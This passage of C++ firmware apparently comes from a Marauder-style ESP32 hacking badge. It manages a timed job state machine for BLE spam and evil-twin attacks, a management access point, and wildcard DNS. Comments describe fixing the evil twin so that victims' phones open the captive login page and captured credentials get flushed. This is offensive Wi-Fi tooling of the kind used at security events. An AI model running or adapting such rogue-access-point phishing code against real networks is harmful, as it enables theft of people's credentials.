      cli_obj.runCommand("stopscan");
      this->mgmt_job_state = MGMT_JOB_REARM;
      this->mgmt_job_t0    = now;
    }
  } else if (this->mgmt_job_state == MGMT_JOB_ATTACK) {
    if (this->mgmt_job_duration_s > 0 &&
        now - this->mgmt_job_t0 >= this->mgmt_job_duration_s * 1000UL) {
      Serial.println("[MGMT] job timer expired (" + this->mgmt_job_kind +
                     "); stopscan + rearm");
      cli_obj.runCommand("stopscan");
      // A BLE job ran after the radio teardown, and NimBLE never gives its
      // heap back on deinit — a re-armed AP would come up but fail to accept
      // clients. Reboot instead: that restores the full heap and clean
      // management mode. Operator model: timed BLE ends -> badge restarts.
      if (this->mgmt_job_kind.startsWith("blespam") ||
          this->mgmt_job_kind == "ble-scan") {
        Serial.println("[MGMT] BLE job finished; rebooting to restore full heap");
        SerialMirror::logDrain();
        delay(200);
        ESP.restart();
      }

      // Evil twin is the only attack kind that owns the web server and the DNS
      // server, so it needs an explicit teardown. This used to sit in a second
      // `if` below and was dead code: the block above already assigned
      // mgmt_job_t0 = now, so that test compared now against now and could
      // never be true for any non-zero duration. The result was a DNS server
      // still answering every query after the attack ended, plus the captive
      // portal routes left registered alongside the management ones, and
      // server.begin() being called on a server that was never stopped.
      if (this->mgmt_job_kind == "eviltwin") {
        Serial.println("[MGMT] evil twin duration expired; stopping portal + DNS");
        this->runServer = false;
        server.stop();
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
      }

      this->mgmt_job_state = MGMT_JOB_REARM;
      this->mgmt_job_t0    = now;
    }
  } else if (this->mgmt_job_state == MGMT_JOB_REARM) {
    if (now - this->mgmt_job_t0 >= 500) { // let stopscan settle the radio
      this->rearmManagementAP();
      // If we came from evil twin, restart management server
      // (server.stop() was called; begin() starts it again)
      this->setupManagementServer();
      server.begin();
      Serial.println("[MGMT] Management server restarted after rearm");
      this->mgmt_job_state      = MGMT_JOB_IDLE;
      this->mgmt_job_kind       = "";
      this->mgmt_job_duration_s = 0;
    }
  }
}

void EvilPortal::startManagementPortal() {
  // Chip-unique SSID suffix from the eFuse base MAC; the password is the
  // fixed event password (MGMT_AP_PASS), no longer chip-derived.
  uint8_t mac[6];
  esp_efuse_mac_get_default(mac);
  char suffix[5];
  snprintf(suffix, sizeof(suffix), "%02x%02x", mac[4], mac[5]);
  this->mgmt_ssid = "PWNTERREY-" + String(suffix);

  if (!this->rearmManagementAP())
    return;

  if (!SPIFFS.begin(true))
    Serial.println("[MGMT] WARNING: SPIFFS mount failed - portal.html will 404");

  // AP client join/leave logging via the Serial mirror (bounded write path)
  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info){
    if (event == ARDUINO_EVENT_WIFI_AP_STACONNECTED)
      Serial.println("[MGMT] client connected");
    else if (event == ARDUINO_EVENT_WIFI_AP_STAIPASSIGNED)
      Serial.println("[MGMT] client got IP " +
                     IPAddress(info.wifi_ap_staipassigned.ip.addr).toString());
    else if (event == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED)
      Serial.println("[MGMT] client disconnected reason=" +
                     String(info.wifi_ap_stadisconnected.reason));
  });

  this->setupManagementServer();
  // Log every HTTP request on serial (method, path, client) so we can see
  // whether the browser reaches the badge at all and which request stalls.
  static bool mgmt_log_added = false;
  if (!mgmt_log_added) {
    server.addMiddleware([](WebServer &srv, Middleware::Callback next) {
      Serial.printf("[HTTP] %s %s from %s heap=%u\n",
                    srv.method() == HTTP_GET ? "GET" : "POST",
                    srv.uri().c_str(),
                    srv.client().remoteIP().toString().c_str(),
                    (unsigned)ESP.getFreeHeap());
      return next();
    });
    mgmt_log_added = true;
  }
  server.begin();
  // DHCP hands out 192.168.4.1 as DNS. Without a resolver there, iOS/macOS
  // cannot resolve captive.apple.com, mark the network as broken and leave
  // (reason=8 ASSOC_LEAVE right after getting a lease). Answer every name
  // with the badge IP so the OS probe reaches /hotspot-detect.html -> Success.
  // DNSServer runs on AsyncUDP: no polling needed in mainManagement().
  if (this->dnsServer.start(53, "*", WiFi.softAPIP()))
    Serial.println("[MGMT] DNS resolver up (all names -> 192.168.4.1)");
  else
    Serial.println("[MGMT] WARNING: DNS resolver failed to start");
  this->management_active = true;

  // One-time USB console reveal after boot; password is never in any response
  delay(2000);
#ifdef MARAUDER_FLIPPER_C5
  // On C5 with CDCOnBoot, Serial writes block until a consumer connects.
  // Use telemetry() (non-blocking) so setup() doesn't stall before loop() starts.
  {
    String ssid_msg  = "[MGMT] AP SSID: " + this->mgmt_ssid + "\n";
    String pass_msg  = "[MGMT] AP password: " MGMT_AP_PASS "\n";
    String ip_msg    = "[MGMT] AP IP: " + WiFi.softAPIP().toString() + "\n";
    Serial.telemetry(ssid_msg.c_str());
    Serial.telemetry(pass_msg.c_str());
    Serial.telemetry(ip_msg.c_str());
  }
#else
  Serial.println("[MGMT] AP SSID: " + this->mgmt_ssid);
  Serial.println("[MGMT] AP password: " + String(MGMT_AP_PASS));
  Serial.println("[MGMT] AP IP: " + WiFi.softAPIP().toString());
#endif
}

void EvilPortal::mainManagement() {
  // Serve HTTP only while the management AP is actually up.
  if (this->management_active) {
    server.handleClient();
  }
  // Evil twin servicing. EvilPortal::main() is where the original firmware
  // pumped DNS and consumed captured credentials, and it is commented out of
  // the sketch's loop() on this build. So during an evil twin the DNS server
  // was started and then never asked to answer a single query: the victim got
  // an address from DHCP, the phone's captive-portal probe went unanswered,
  // and the phone concluded there was no internet instead of opening the
  // login page. An access point that hands out an IP and shows no portal -
  // exactly what was reported from the field.
  //
  // HTTP itself needs no extra call here: management_active deliberately stays
  // true through the attack, so handleClient() above already services the
  // portal's routes, which setupServer() re-registered.
  if (this->mgmt_job_kind == "eviltwin" && this->has_ap && this->has_html) {
    this->dnsServer.processNextRequest();
    this->flushCapturedCreds();
  }
  // Advance the job state machine ALWAYS — never gate this on
  // management_active. The BLE path tears the radio down and clears that flag
  // on purpose, and the timed-BLE reboot lives inside mgmtServiceJob(): gating
  // it here made timed BLE jobs run forever and left the badge unreachable
  // until a manual RESET. Safe to call unconditionally because the function
  // dispatches on mgmt_job_state and is a no-op while IDLE.
  this->mgmtServiceJob();
}
